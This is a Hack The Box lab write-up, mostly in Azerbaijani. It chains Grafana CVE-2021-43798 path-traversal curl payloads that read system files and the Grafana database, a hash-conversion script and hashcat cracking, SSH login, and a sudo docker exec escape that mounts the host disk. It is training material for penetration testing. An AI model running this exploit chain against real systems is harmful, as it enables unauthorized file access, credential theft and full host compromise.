````markdown
# HTB Linux Lab Writeup — Grafana CVE-2021-43798

## Overview

Bu lab-da ilkin giriş nöqtəsi olaraq **Grafana CVE-2021-43798** istifadə olundu. Zəiflik Grafana-da unauthenticated path traversal / arbitrary file read imkanı verir. Bu zəiflik vasitəsilə serverdəki fayllar oxundu, Grafana database faylı əldə edildi, istifadəçi hash-i crack edildi və SSH ilə sistemə giriş alındı.

Sonrakı mərhələdə `sudo -l` nəticəsində `docker exec` komandasının root kimi parolsuz işlədilə bildiyi aşkarlandı. Bu icazədən istifadə edərək Grafana container-inə root kimi daxil olundu və container içindən host filesystem mount edilərək root flag oxundu.

---

## 1. Grafana Version Enumeration

Əvvəlcə Grafana versiyası yoxlanıldı:

```bash
curl http://10.129.234.47:3000/api/health
````

Nəticə:

```json
{
  "commit": "41f0542c1e",
  "database": "ok",
  "version": "8.0.0"
}
```

Grafana `8.0.0` versiyası **CVE-2021-43798** üçün vulnerable ola bilər.

---

## 2. Testing CVE-2021-43798

Zəiflik `/public/plugins/` endpoint-i üzərindən test edildi.

```bash
curl --path-as-is "http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
```

Nəticədə `/etc/passwd` faylı oxundu:

```text
root:x:0:0:root:/root:/bin/ash
...
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
```

Bu nəticə təsdiqlədi ki, path traversal işləyir və serverdə fayl oxumaq mümkündür.

---

## 3. Reading Grafana Configuration

Sonra Grafana configuration faylı oxundu:

```bash
curl --path-as-is "http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini"
```

Config faylında database-in SQLite olduğu və `grafana.db` faylından istifadə etdiyi göründü:

```ini
[database]
type = sqlite3
path = grafana.db
```

Həmçinin security bölməsində default admin məlumatları və `secret_key` göründü:

```ini
[security]
admin_user = admin
admin_password = admin
secret_key = SW2YcwTIb9zpOOhoPsMm
```

Qeyd: `admin_password = admin` default config-də görünə bilər, amma real parol database-də hash formasında saxlanılır.

---

## 4. Downloading Grafana Database

Grafana database faylı yükləndi:

```bash
curl --path-as-is "http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
```

Database faylı yoxlandı:

```bash
file grafana.db
```

Sonra SQLite ilə açıldı:

```bash
sqlite3 grafana.db ".tables"
```

User məlumatları çıxarıldı:

```bash
sqlite3 grafana.db "select id,login,email,password,salt,is_admin from user;"
```

Nəticə:

```text
1|admin|admin@localhost|<hash>|<salt>|1
2|boris|boris@data.vl|<hash>|LCBhdtJWjl|0
```

Burada `boris` istifadəçisinin password hash-i və salt dəyəri əldə edildi.

---

## 5. Converting Grafana Hash to Hashcat Format

Grafana hash formatı **PBKDF2-HMAC-SHA256** idi. Hashcat ilə crack etmək üçün hash uyğun formata çevrildi.

`convert.py`:

```python
#!/usr/bin/env python3
import base64
import binascii
import sys

PASSWORD_HEX = "dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8"
SALT_STR = "LCBhdtJWjl"
ITERATIONS = 10000

try:
    target_raw = binascii.unhexlify(PASSWORD_HEX)
except (binascii.Error, ValueError) as e:
    print("ERROR: PASSWORD_HEX is not valid hex:", e)
    sys.exit(1)

target_hash64 = base64.b64encode(target_raw).decode("utf-8")
salt64 = base64.b64encode(SALT_STR.encode("utf-8")).decode("utf-8")

print(f"sha256:{ITERATIONS}:{salt64}:{target_hash64}")
```

Script işlədildi:

```bash
python3 convert.py > hash.txt
cat hash.txt
```

Nəticə:

```text
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=
```

---

## 6. Cracking the Hash

Hashcat command:

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

Cracked credential:

```text
boris:beautiful1
```

---

## 7. SSH Access

Tapılmış credential ilə SSH giriş yoxlandı:

```bash
ssh boris@10.129.234.47
```

Password:

```text
beautiful1
```

Giriş uğurlu oldu və user flag oxundu:

```bash
cat /home/boris/user.txt
```

---

## 8. Privilege Escalation Enumeration

Sistemdə sudo icazələri yoxlanıldı:

```bash
sudo -l
```

Nəticə:

```text
User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
```

Bu o deməkdir ki, `boris` user-i parol daxil etmədən `docker exec` komandasını root kimi işlədə bilər.

---

## 9. Getting Root Inside the Grafana Container

Grafana container-inə root kimi daxil olundu:

```bash
sudo /snap/bin/docker exec -u 0 -it grafana /bin/sh
```

Container daxilində yoxlama:

```bash
whoami
```

Nəticə:

```text
root
```

Bu mərhələdə root olmaq host sistemdə root olmaq demək deyil. Bu, hələlik container daxilində root idi.

---

## 10. Checking Disk Devices Inside the Container

Container daxilində disk bölmələri yoxlandı:

```bash
fdisk -l
```

Nəticədə `/dev/sda1` göründü:

```text
/dev/sda1    Linux
/dev/sda2    Linux swap
```

Bu çox vacib idi, çünki `/dev/sda1` host sistemin əsas Linux filesystem bölməsi idi.

---

## 11. Mounting Host Filesystem

Host filesystem-ə baxmaq üçün mount point yaradıldı:

```bash
mkdir /mnt/host_root
```

Sonra host disk bölməsi həmin qovluğa mount edildi:

```bash
mount /dev/sda1 /mnt/host_root
```

Mount etmək Linux-da bir disk və ya partition-u müəyyən bir qovluğa qoşmaq deməkdir. Bu halda `/dev/sda1` host sistemin disk bölməsi idi və `/mnt/host_root` altında görünməyə başladı.

Sonra host root qovluğu yoxlandı:

```bash
ls /mnt/host_root/root
```

Nəticə:

```text
root.txt
snap
```

Root flag oxundu:

```bash
cat /mnt/host_root/root/root.txt
```

---

## Privilege Escalation Explanation

Privilege escalation zənciri belə idi:

```text
Grafana CVE-2021-43798
    ↓
Unauthenticated file read
    ↓
grafana.db faylı oxundu
    ↓
boris user hash-i əldə edildi
    ↓
hash crack edildi
    ↓
SSH ilə boris kimi giriş edildi
    ↓
sudo -l ilə docker exec icazəsi tapıldı
    ↓
Grafana container-inə root kimi daxil olundu
    ↓
Container içində host disk /dev/sda1 göründü
    ↓
/dev/sda1 mount edildi
    ↓
Host-un /root/root.txt faylı oxundu
```

Əsas problem iki yerdə idi:

1. `boris` user-inə təhlükəli sudo icazəsi verilmişdi:

```text
(root) NOPASSWD: /snap/bin/docker exec *
```

2. Container host disk device-lərinə çıxış əldə edə bilirdi və mount əmri işləyirdi.

Bu isə container isolation zəifliyinə səbəb oldu. Nəticədə container içində root olmaq host filesystem-i oxumağa imkan verdi.

---

## Summary

Bu lab-da ilkin giriş Grafana path traversal zəifliyi ilə əldə edildi. Grafana database faylı oxundu, `boris` istifadəçisinin hash-i crack edildi və SSH giriş alındı. Daha sonra `sudo docker exec` icazəsi abuse edilərək Grafana container-inə root kimi daxil olundu. Container daxilindən host disk bölməsi mount edilərək root flag əldə edildi.

Final attack chain:

```text
CVE-2021-43798 → Grafana DB leak → Hash cracking → SSH as boris → sudo docker exec → Container root → Mount host filesystem → Root flag
```

```
